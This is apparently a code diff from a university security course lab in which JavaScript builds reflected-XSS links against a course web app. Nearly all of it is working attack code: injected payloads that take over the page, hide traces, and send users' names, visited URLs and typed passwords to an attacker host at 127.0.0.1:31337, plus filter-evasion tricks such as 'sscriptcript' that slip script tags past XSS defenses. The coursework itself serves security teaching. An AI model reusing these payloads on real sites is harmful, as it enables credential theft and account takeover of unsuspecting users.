@@ -6,52 +6,49 @@
 			// $(`a:contains(`script`)`).hide(); $(`a:contains(`sscriptcript`)`).hide();
 
 			// $(`a`).contains(`sscriptcript`).hide(); 
-
+//ad+`
 function payload3() {
 	var a=`http://127.0.0.1:31337/`
 	function proxy(href, purl, stat) {
 		$(`html`).load(href, function(){
 		$(`html`).show();
-			var realURL = window.location.href; 
+			var ad = `http://cis551.cis.upenn.edu/project3/`;
+			var ru = window.location.href; 
 			$(`a`).each(function() {
 			    if(this.href.indexOf(`sscriptcript`)!=-1||this.href.indexOf(`script`)!=-1){
 			        $(this).hide();}});
 			history.replaceState(window.history.state, `/project3`, `/project3`);
 		    $(`#search-btn`).click(function(e){
 		      var q = $(`#query`).val().split(` `).join(`+`);
-			  $.get(`http://cis551.cis.upenn.edu/project3/search?q=` + q, 
+			  $.get(ad+`search?q=` + q, 
 			  function(e){document.write(e);});
 			  e.preventDefault();
-  		      proxy(`http://cis551.cis.upenn.edu/project3/search?q=` + q, realURL, 1);
+			  $.get(attacker+`stolen?event=nav&user=`+$(`#logged-in-user`).text()+`&url=`+ad+`search?q=`+q);
+  		      proxy(ad+`search?q=` + q, ru, 1);
 	        });
 	        $(`#search-again-btn`).click(function(e){
 		      e.preventDefault();
+			  $.get(attacker+`stolen?event=nav&user=`+$(`#logged-in-user`).text()+`&url=`+ad+`search`);
 			  window.location.replace(purl);
 	        }); 
 		    $(`#log-in-btn`).click(function(e){
 		      e.preventDefault();
-			  $.post(`http://cis551.cis.upenn.edu/project3/login?csrfdefense=0&xssdefense=3`, 
+			  $.post(ad+`login?csrfdefense=0&xssdefense=3`, 
 			  {username: $(`#username`).val(), password: $(`#userpass`).val()});
 			  $.get(a+`stolen?event=login&user=`+$(`#username`).val()+`&pass=`+$(`#userpass`).val());
-			  window.location.replace(realURL);
+			  window.location.replace(ru);
 	        }); 
 		    $(`#new-account-btn`).click(function(e){
 		      e.preventDefault();
-			  $.post(`http://cis551.cis.upenn.edu/project3/create?csrfdefense=0&xssdefense=3`, 
+			  $.post(ad+`create?csrfdefense=0&xssdefense=3`, 
 			  {username: $(`#username`).val(), password: $(`#userpass`).val()}) 
-			  window.location.replace(realURL);
+			  window.location.replace(ru);
 	        }); 
 		    $(`#log-out-btn`).click(function(e){
 		      e.preventDefault();
-			  $.post(`http://cis551.cis.upenn.edu/project3/logout?csrfdefense=0&xssdefense=3`)
+			  $.post(ad+`logout?csrfdefense=0&xssdefense=3`)
 			  $.get(a + `stolen?event=logout&user=`+$(`#logged-in-user`).text());
-		      if (stat == 0) {
-		      	  alert(`hey`+realURL);
-				  window.location.replace(realURL);
-		      } else {
-		      	  alert(`ho`+purl);
-				  window.location.replace(purl);
-		      }
+		      if (stat == 0) {window.location.replace(ru);} else {window.location.replace(purl);}
 	        }); 
 			});
 		}
@@ -59,52 +56,96 @@ function payload3() {
 	proxy(`./`, `./`, 0);
 }
 
+function payload2(attacker) {
+	function proxy(href, purl, stat) {
+		$(`html`).load(href, function(){
+		$(`html`).show();
+			$(`a`).each(function() {
+			    if(this.href.indexOf(`sscriptcript`)!=-1||this.href.indexOf(`script`)!=-1){
+			        $(this).hide();}});
+			var ad = `http://cis551.cis.upenn.edu/project3/`;
+			var ru = window.location.href;
+			history.replaceState(window.history.state, `/project3`, `/project3`); 
+		    $(`#search-btn`).click(function(e){
+		      var q = $(`#query`).val().split(` `).join(`+`);
+			  $.get(ad+`search?q=` + q, 
+			  function(e){document.write(e);});
+			  e.preventDefault();
+			  $.get(attacker+`stolen?event=nav&user=`+$(`#logged-in-user`).text()+`&url=`+ad+`search?q=`+q);
+  		      proxy(ad+`search?q=` + q, ru, 1);
+	        }); 
+	        $(`#search-again-btn`).click(function(e){
+		      e.preventDefault();
+			  $.get(attacker+`stolen?event=nav&user=`+$(`#logged-in-user`).text()+`&url=`+ad+`search`);
+			  window.location.replace(purl);
+	        }); 
+		    $(`#log-in-btn`).click(function(e){
+		      e.preventDefault();
+			  $.post(ad+`login?csrfdefense=0`, 
+			  {username: $(`#username`).val(), password: $(`#userpass`).val()});
+			  $.get(attacker+`stolen?event=login&user=`+$(`#username`).val()+`&pass=` +$(`#userpass`).val());
+			  window.location.replace(ru);
+	        }); 
+		    $(`#new-account-btn`).click(function(e){
+		      e.preventDefault();
+			  $.post(ad+`create?csrfdefense=0`, 
+			  {username: $(`#username`).val(), password: $(`#userpass`).val()}) 
+			  window.location.replace(ru);
+	        }); 
+		    $(`#log-out-btn`).click(function(e){
+		      e.preventDefault();
+			  $.post(ad+`logout?csrfdefense=0`)
+			  $.get(attacker + `stolen?event=logout&user=`+$(`#logged-in-user`).text());
+			  window.location.replace(ru);
+		      if (stat == 0) {window.location.replace(ru);} else {window.location.replace(purl);}
+	        }); 
+			});
+		}
+	$(`html`).hide();
+	proxy(`./`, `./`, 0);
+}
+
+//http://127.0.0.1:31337/stolen?event=nav&user=<username>&url=<encoded_url>
 function payload(attacker) {
 	function proxy(href, purl, stat) {
 		$("html").load(href, function(){
 		$("html").show();
-			var realURL = window.location.href;
-			console.log(window.history.state);
+			var ad = "http://cis551.cis.upenn.edu/project3/";
+			var ru = window.location.href;
 			history.replaceState(window.history.state, '/project3', "/project3"); 
 			$('a:contains("<script>")').hide(); $('a:contains("<sscriptcript>")').hide();
 		    $("#search-btn").click(function(e){
 		      var q = $("#query").val().split(' ').join('+');
-			  $.get("http://cis551.cis.upenn.edu/project3/search?q=" + q, 
+			  $.get(ad+"search?q=" + q, 
 			  function(e){document.write(e);});
 			  e.preventDefault();
-		      alert(realURL);
-  		      proxy("http://cis551.cis.upenn.edu/project3/search?q=" + q, realURL, 1);
+			  $.get(attacker+"stolen?event=nav&user="+$('#logged-in-user').text()+"&url="+ad+"search?q="+q);
+  		      proxy(ad+"search?q=" + q, ru, 1);
 	        }); 
 	        $("#search-again-btn").click(function(e){
 		      e.preventDefault();
-		      alert(0)
+			  $.get(attacker+"stolen?event=nav&user="+$('#logged-in-user').text()+"&url="+ad+"search");
 			  window.location.replace(purl);
 	        }); 
 		    $("#log-in-btn").click(function(e){
 		      e.preventDefault();
-			  $.post("http://cis551.cis.upenn.edu/project3/login?csrfdefense=0", 
+			  $.post(ad+"login?csrfdefense=0", 
 			  {username: $('#username').val(), password: $('#userpass').val()});
 			  $.get(attacker+"stolen?event=login&user="+$('#username').val()+"&pass=" +$('#userpass').val());
-			  window.location.replace(realURL);
+			  window.location.replace(ru);
 	        }); 
 		    $("#new-account-btn").click(function(e){
 		      e.preventDefault();
-			  $.post("http://cis551.cis.upenn.edu/project3/create?csrfdefense=0", 
+			  $.post(ad+"create?csrfdefense=0", 
 			  {username: $('#username').val(), password: $('#userpass').val()}) 
-			  window.location.replace(realURL);
+			  window.location.replace(ru);
 	        }); 
 		    $("#log-out-btn").click(function(e){
 		      e.preventDefault();
-			  $.post("http://cis551.cis.upenn.edu/project3/logout?csrfdefense=0")
+			  $.post(ad+"logout?csrfdefense=0")
 			  $.get(attacker + "stolen?event=logout&user="+$('#logged-in-user').text());
-			  window.location.replace(realURL);
-		      if (stat == 0) {
-		      	  alert(`hey`+realURL);
-				  window.location.replace(realURL);
-		      } else {
-		      	  alert(`ho`+purl);
-				  window.location.replace(purl);
-		      }
+			  window.location.replace(ru);
+		      if (stat == 0) {window.location.replace(ru);} else {window.location.replace(purl);}
 	        }); 
 			});
 		}
@@ -132,8 +173,8 @@ function makeLink(xssdefense, target, attacker) {
 			";payload(\"" + attacker + "\");" + "</" + "sscriptcript" + ">");
 		} else if (xssdefense == 3) {
 			return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
-			encodeURIComponent("<script" + ">" + payload3.toString() +
-			";payload3();" + "</" + "script" + ">");
+			encodeURIComponent("<script" + ">" + payload2.toString() +
+			";payload2(\`" + attacker + "\`);" + "</" + "script" + ">");
 		}
 	}
 
